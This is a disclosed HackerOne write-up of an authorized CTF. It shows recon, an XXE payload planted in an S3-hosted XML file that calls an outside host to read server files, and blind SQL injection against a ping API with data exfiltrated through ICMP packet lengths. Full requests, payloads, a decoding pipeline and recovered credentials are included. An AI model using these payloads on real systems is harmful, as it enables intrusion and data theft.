---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/xml-external-entities-xxe
  - env/web
substate: "resolved"
weakness: "XML External Entities (XXE)"
enriched: true
body: true
date: 2021-06-21
submitted: 2021-06-06T21:14:40.722Z
bounty_usd: null
votes: 17
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "rykkard"
source: "https://hackerone.com/reports/1218708"
title: "HackerOne’s 100K CTF Writeup"
---
# HackerOne’s 100K CTF Writeup

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 17 | **Program:** h1-ctf | **Disclosed:** 2021-06-21

- Report: [https://hackerone.com/reports/1218708](https://hackerone.com/reports/1218708)
- CWE: XML External Entities (XXE)
- Submitted: 2021-06-06T21:14:40.722Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Greetings team
It has been a great challenge, thank you very much for the fun moments and also for the annoying ones :)

██████████

P.S. I will put my writeup in my next comment.

## Impact

---

## Timeline

- **Report Filed**
- **2021-06-07** @rykkard: # HackerOne's 100K CTF Writeup

## A new journey begins

After reading the CTF rules on [h1-ctf][h1-ctf] we grab our challenge scope:

> In scope:
> *.ccc.h1ctf.com

Basic DNS recon while inspecting the main page leads us to two new subdomains:

```bash
❯ crtsh ccc.h1ctf.com
ccc.h1ctf.com
centomila.ccc.h1ctf.com
einhunderttausend.ccc.h1ctf.com

❯ dig ccc.h1ctf.com centomila.ccc.h1ctf.com einhunderttausend.ccc.h1ctf.com
ccc.h1ctf.com.          229     IN      A       18.216.97.43
centomila.ccc.h1ctf.com. 240    IN      A       18.216.97.43
einhunderttausend.ccc.h1ctf.com. 300 IN A       18.216.97.43
```

Where both subdomains `centomila,einhunderttausend` mean `one hundred thousand` on Italian and German language respectively, at first sight both subdomains points to the same web application, so they are likely just an Easter egg ?:

Lets check the main app on `https://ccc.h1ctf.com/` then

{F1329069}

Here we can register one new account on `/register`, so we first register a test user with credentials:

> Test user:
> admin@h1ctf.com:pizza4me

After logged in with our test user, we got redirected to `/u/9qes96` with `500 Internal Server Error` as HTTP response code and one critical warning pointing to some remote file not found.

{F1329070}

Deleting cookies and through `/login`, the login form requires as inputs:
- user hash
- email
- password

We tried to log in using `9qes96` as our user hash and were successfully logged into our session again.

> Test user hash: 9qes96
> Test user cookie: token=b9bc3e331cc616dc3ff0b2c3cbc65572

With no more visible content when browsing the web application, we move on to content discovery with our authenticated cookies:

```bash
❯ ffuf -w /usr/share/wordlists/playground/ctf/common.txt -u https://ccc.h1ctf.com/FUZZ -b 'token=b9bc3e331cc616dc3ff0b2c3cbc65572'
<..>
.config                 [Status: 200, Size: 124, Words: 3, Lines: 1, Duration: 154ms]
_config                 [Status: 200, Size: 124, Words: 3, Lines: 1, Duration: 149ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 119ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 146ms]
login                   [Status: 200, Size: 1967, Words: 405, Lines: 37, Duration: 129ms]
register                [Status: 200, Size: 1802, Words: 352, Lines: 35, Duration: 108ms]
zipfiles                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 138ms]
:: Progress: [4685/4685] :: Job [1/1] :: 241 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Also, there is a Twitter link to web design company [@DesignsCcc][@DesignsCcc] on the home page. Inspecting that twitter feed we got two interesting clues:

- https://twitter.com/DesignsCcc/status/1398629597298806786
> We've just finished our first website! This project was great fun!
> {F1329071}

- https://twitter.com/DesignsCcc/status/1398981963625676802
> Does anyone know if in nginx you can link a directory to a proxy_pass?

In the Twitter image we got an interesting path `/error_-_-_log.txt`, where we have found some URLs of XML files in s3 buckets.

```bash
❯ curl 'https://ccc.h1ctf.com/error_-_-_log.txt'
File: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://h1-y0c9ov.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://h1-56qw4c.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml Not Found%

# inspecting objects
<..>
❯ curl 'https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml'
<?xml version="1.0" ?>
<r>dWdnY2Y6Ly9sYmhnaC5vci9iVXQ1RldMRVVOMA==</r>

# Rickrolled T.T
❯ echo dWdnY2Y6Ly9sYmhnaC5vci9iVXQ1RldMRVVOMA== | base64 -d | rot13
https://youtu.be/oHg5SJYRHA0%

# inspecting bucket perms
❯ s3scanner scan --dangerous --buckets-file ~/projects/h1ctf/buckets.txt
INFO: Including dangerous checks. WARNING: This may change bucket ACL destructively
h1-56qw4c | bucket_exists | AuthUsers: [], AllUsers: []
h1-y0c9ov | bucket_exists | AuthUsers: [], AllUsers: [ReadACP]
h1-wfzfi4 | bucket_exists | AuthUsers: [], AllUsers: []
h1-cn9uhd | bucket_exists | AuthUsers: [], AllUsers: []
h1-6hin8w | bucket_exists | AuthUsers: [], AllUsers: [ReadACP]
```

Here we noticed that the hash of our `9qes96` account seems to be related to the s3 bucket name with the pattern` h1-<userhash>`. However, my concerns about the s3 bucket pricing lead me to follow other paths.

## Packed for everyone

Fuzzing zip files on `/zipfiles` leads us to one likely juicy file:

```bash
❯ ffuf -w /usr/share/wordlists/playground/ctf/common.txt -u https://ccc.h1ctf.com/zipfiles/FUZZ -b 'token=b9bc3e331cc616dc3ff0b2c3cbc65572' -e .zip
users.zip               [Status: 200, Size: 381, Words: 4, Lines: 2, Duration: 139ms]
:: Progress: [9370/9370] :: Job [1/1] :: 353 req/sec :: Duration: [0:00:27] :: Errors: 0 ::
```

And we got some nice hashes there ?:

```bash
❯ wget https://ccc.h1ctf.com/zipfiles/users.zip -q
❯ unzip users.zip
❯ cat users.txt
user_01:195fbb57ffe7449796d23466085ce6d8
user_02:639bae9ac6b3e1a84cebb7b403297b79
user_03:910955a907e739b81ec8855763108a29
user_04:f9323f5b51fc23e30c10623bd38de6ff
user_05:ed2b5c0139cec8ad2873829dc1117d50
user_06:62cc0b4ebb0b57b40778179234246c38
user_07:9c62ad1fc551d04b815c8573285b65b2
user_08:8bf8854bebe108183caeb845c7676ae4
user_09:8fc42c6ddf9966db3b09e84365034357
user_10:adc3d649dd387e0c441a0c10f6219c63
```

After trying to use them as a cookie token with no luck, we managed to crack them using [search-that-hash][sth] and got a nice Easter egg:

> Secret message:
> "May you be well on your side of the screen."

## Unexpected trip

Going back to fuzzing, trying to fuzz GET request parameters on `u/9qes96` gave us some interesting responses:

```bash
❯ ffuf -w /usr/share/wordlists/playground/ctf/burp-parameter-names.txt -u 'https://ccc.h1ctf.com/u/9qes96?FUZZ=foo' -b 'token=b9bc3e331cc616dc3ff0b2c3cbc65572' -mc all -fc 500
description             [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 2161ms]
script                  [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3100ms]
scripts                 [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3097ms]
noalert                 [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3087ms]
txtDescription          [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3163ms]
subscription            [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3081ms]
alert                   [Status: 400, Size: 24, Words: 3, Lines: 1, Duration: 3082ms]
:: Progress: [2588/2588] :: Job [1/1] :: 14 req/sec :: Duration: [0:02:59] :: Errors: 0 ::

❯ curl 'https://ccc.h1ctf.com/u/9qes96?fooscriptbar=foo' -b 'token=b9bc3e331cc616dc3ff0b2c3cbc65572'
<h1>NOC WAF Tripped</h1>%
```

There is a WAF that blocks our request if our request contains these keywords:
- script
- alert

Here, after a few hours with no idea what to do, we try to search for similar projects in public GitHub repositories.

And we found one juicy repository:
> GitHub dork: "WAF Tripped"

{F1329068}

> repository: https://github.com/ccc-labs/pinger
> project: Pinger
> description: Pinger is a simple application for sending ping requests from a webserver and includes a simple API to do so.
> user: ccc-labs
> committers: ccc-labs, Adam

We now have the source code for the Pinger project, which is probably owned by the same design company as our target web application.

But it does not represent a direct exploitation route, maybe it will be useful for later ?:

## Such a bucket

Here, with no other paths to go and after searching for ideas on the awesome [Hacker101 discord][h101discord], it was suggested to us that we need to take a closer look at the s3 bucket pricing.

Sure! That route was doable and we already had a lot of pieces out of fit, so we first created an s3 bucket `h1-9qes96` through the [AWS Management Console][AWS] .

> S3 bucket: 
> h1-9qes96

And since we already know that the target web application expects a file called `file.xml`, we can test some XXE vectors there.

```bash
❯ aws s3 ls
2021-06-05 17:34:09 h1-9qes96

❯ cat files.xml
<?xml version="1.0"?>
<!DOCTYPE POC [
<!ENTITY % xxe SYSTEM "https://test.██████/blind.xml">
%xxe;
]>

❯ aws s3 cp files.xml s3://h1-9qes96 --acl public-read
upload: ./files.xml to s3://h1-9qes96/files.xml

```

We got one HTTPS interaction after navigating to `/u/9qes96` to activate the XML parser. So we have a XEE vulnerability there, we went on to exploit it using [xxeserv][xxeserv] with php filters `php://filter/read=convert.base64-encode/resource=` where we managed to exfiltrate interesting data in:

- /etc/nginx/sites-available/default
```plaintext
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
#server {
#        listen 80 default_server;
#        listen [::]:80 default_server;
#
#        root /var/www/html;
#
#        # Add index.php to the list if you are using PHP
#        index index.html index.htm index.nginx-debian.html;
#
#        server_name _;
#
#        location / {
#                try_files $uri $uri/ =404;
#        }       
#}

#server {
#    server_name ccc.h1ctf.com;
#    root /var/www/app/public;
#    index index.php;
#    location / {
#            try_files $uri $uri/ /index.php?$query_string;
#    }
#     location /2b5d2b11513d2c9b {
#       proxy_pass http://127.0.0.1:8888;
#     }
#
#    location ~ \.php$ {
#           base64: invalid input
```

Where we found an internal web application was available through `/2b5d2b11513d2c9b`.

## Internal pokes

In `/2b5d2b11513d2c9b` we got a login form for a web application called `Pinger`. The pieces started to fit together from here.

{F1329067}

We already have access to Pinger's source code, so let's take a close look at its source code on GitHub:

The relevant pieces in the source code are:
- https://github.com/ccc-labs/pinger/blob/main/index.php
```php
//<..>
if( $url == '/' ){
    Controller\Pinger::home();
}elseif( $url == '/api/ping' ){
    Controller\Pinger::ping();
}else{
    Controller\Pinger::error404();
}
```
- https://github.com/ccc-labs/pinger/blob/main/\_pingercode\_/controllers/Pinger.php
```php
public static function ping(){
        if( isset($_GET["id"]) ){
            //Has IP address talked to us before? If not create a log file
            if( !file_exists(  '_pingercode_/data/'.$_SERVER["REMOTE_ADDR"].'.txt'   )  ){
                file_put_contents('_pingercode_/data/'.$_SERVER["REMOTE_ADDR"].'.txt',date("U"));
                //Try and send PING to host ID
                Ping::send($_GET["id"]);
                http_response_code(201);
                header('Content-Type: application/json');
                echo json_encode(array(
                    'result'    =>  'If we find a matching ID we\'ll send a ping'
                ));
                exit();
            }else{
                //GET timestamp of last time IP requested a ping
                $last_sent = (int)file_get_contents('_pingercode_/data/'.$_SERVER["REMOTE_ADDR"].'.txt');
                //Make sure IP didn't make a request in the last 60 seconds
                if( $last_sent < ( date("U") - 60 ) ){
                    Ping::send($_GET["id"]);
                    file_put_contents('_pingercode_/data/'.$_SERVER["REMOTE_ADDR"].'.txt',date("U"));
                    http_response_code(201);
                    header('Content-Type: application/json');
                    echo json_encode(array(
                        'result'    =>  'If we find a matching ID we\'ll send a ping'
                    ));
                    exit();
                }else{
                    http_response_code(400);
                    header('Content-Type: application/json');
                    echo json_encode(array(
                        'error' =>  'Too many requests from IP '.$_SERVER["REMOTE_ADDR"].', only one per minute',
                    ));
                    exit();
                }
            }
        }else{
            http_response_code(400);
            header('Content-Type: application/json');
            echo json_encode(array(
                'error' =>  'Missing Query String Variable id',
            ));
            exit();
        }
    }
```
- https://github.com/ccc-labs/pinger/blob/main/\_pingercode\_/models/Ping.php
```php
class Ping
{
    public static function send( $id ){
        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';
        $d = Db::connect()->prepare($sql);
        $d->execute();
        //Confirm we've found a matching row in the database
        if( $d->rowCount() == 1 ){
            $host = $d->fetch();
            $ip = $host["ip"];
            $packet_size = intval($host["packet_size"]);
            //make sure PING packet size between 1 and 65527
            if( $packet_size > 0 && $packet_size < 65528 ) {
                //check IP is a valid IPv4 Address
                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {
                    //SEND 4 PING PACKETS IN THE BACKGROUND
                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');
                }
            }
        }
    }
}
```

- https://github.com/ccc-labs/pinger/blob/main/db.sql
```sql
CREATE TABLE `host` (
                        `id` int(11) NOT NULL,
                        `ip` varchar(15) NOT NULL DEFAULT '',
                        `packet_size` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
INSERT INTO `host` (`id`, `ip`, `packet_size`) VALUES
(1, '8.8.8.8', 32),
(2, '127.0.0.1', 32),
(3, '8.8.4.4', 32);
<..>
CREATE TABLE `user` (
                        `id` int(11) NOT NULL,
                        `username` varchar(250) NOT NULL,
                        `password` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

INSERT INTO `user` (`id`, `username`, `password`) VALUES
(1, 'admin', 'password');
```

Here we have found a juicy API endpoint `/api/ping` vulnerable to Blind SQLi via the `id` parameter with possible exfiltration via ICMP.

Validating the SQLi using Burp with Hackvector plugin to create our payload:

```html
GET /2b5d2b11513d2c9b/api/ping?id=<@urlencode>0 union select 0,'████████',32<@/urlencode> HTTP/1.1
Host: ccc.h1ctf.com
Cookie: token=b9bc3e331cc616dc3ff0b2c3cbc65572
Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Connection: close

HTTP/1.1 201 Created
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Jun 2021 15:20:55 GMT
Content-Type: application/json
Connection: close
Content-Length: 55

{"result":"If we find a matching ID we'll send a ping"}
```

Where we successfully obtained an interaction with our ICMP listener in our private box:

```bash
$ sudo tcpdump -ni ens4 icmp and icmp[icmptype]=icmp-echo 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens4, link-type EN10MB (Ethernet), capture size 262144 bytes
14:59:20.033481 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 846, seq 1, length 40
14:59:21.034638 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 846, seq 2, length 40
14:59:22.035788 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 846, seq 3, length 40
14:59:23.036969 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 846, seq 4, length 40
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel
```

Now we need to exfiltrate the password of the user `admin` to gain access to the Pinger panel, inspecting the source code we found.:
- `/api/ping` is rate-limited to one request per minute
- We can exfiltrate numeric values via `$packet_size` values
- `$packet_size` values can be retrieved via `length` values on the ICMP records where  `$packet_size` = `length` - 8
- Table schema of `host` and `user` tables

We start with exfil the password length of the user `admin`:

```bash
# payload
/2b5d2b11513d2c9b/api/ping?id=<@urlencode>0 union select 0,'█████',length(password) from user<@/urlencode>

# ping length received: 29
# password length: 29-8 -> 21
```

Then we use Burp Intruder to send 21 requests using this configuration:

> Payload: Numbers 1-21
> Maximum concurrent requests: 1
> Delay between request: 62000 milliseconds

```html
GET /2b5d2b11513d2c9b/api/ping?id=<@urlencode>0 union select 0,'█████',ascii(substring(password,§1§,1)) from user<@/urlencode> HTTP/1.1
Host: ccc.h1ctf.com
Cookie: token=b9bc3e331cc616dc3ff0b2c3cbc65572
Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Connection: close


```

After copying the ICMP records to an `icmpcap.txt` file, we can process it to get our exfiltrated data:

```bash
❯ cat icmpcap.txt | grep '18.216.97.43' | grep 'seq 1,'
19:22:55.242494 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 867, seq 1, length 93
19:23:57.291867 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 868, seq 1, length 108
19:24:59.262256 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 869, seq 1, length 63
19:26:01.279975 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 870, seq 1, length 65
19:27:03.286286 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 871, seq 1, length 102
19:28:05.309613 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 873, seq 1, length 57
19:29:07.226046 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 874, seq 1, length 80
19:30:09.214000 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 875, seq 1, length 80
19:31:11.311736 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 876, seq 1, length 82
19:32:13.188259 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 877, seq 1, length 44
19:33:15.236418 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 878, seq 1, length 95
19:34:17.155049 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 879, seq 1, length 50
19:35:19.184473 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 880, seq 1, length 81
19:36:21.176596 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 881, seq 1, length 87
19:37:23.175452 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 882, seq 1, length 106
19:38:25.198107 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 883, seq 1, length 105
19:39:27.140046 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 884, seq 1, length 83
19:40:29.193445 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 885, seq 1, length 108
19:41:31.187083 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 887, seq 1, length 89
19:42:33.102326 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 888, seq 1, length 111
19:43:35.281116 IP 18.216.97.43 > 10.142.0.4: ICMP echo request, id 889, seq 1, length 81

❯ cat icmpcap.txt | grep '18.216.97.43' | grep 'seq 1,' | awk '{print sprintf("%c",($NF-8))}' | paste -sd ''
Ud79^1HHJ$W*IObaKdQgI
```

So we have now as credentials:
> admin:Ud79^1HHJ$W*IObaKdQgI

Trying to login to `/2b5d2b11513d2c9b/` using those credentials and then..

███████

Success, we got access to the administration panel and we have the flag at our fingertips!

> Flag:
> █████

[h1-ctf]: https://hackerone.com/h1-ctf?type=team
[@DesignsCcc]: https://twitter.com/DesignsCcc
[sth]: https://github.com/HashPals/Search-That-Hash
[h101discord]: https://www.hacker101.com/discord
[AWS]: https://aws.amazon.com/console/
[xxeserv]: https://github.com/staaldraad/xxeserv
- **Report Triaged**
- **2021-06-08** @rykkard: Hey @nahamsec , I'm glad I participated as I am always learning new things from these challenges, a big virtual hug to everyone involved in creating the challenge!
- **Report Resolved**
- **Bounty Awarded**
- **2021-06-18** @rykkard: You are all great, thanks for the bonus!
I am open to disclose this writeup, please redact for me these references that I forgot to retire (again!): `██████████` and `████████`
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
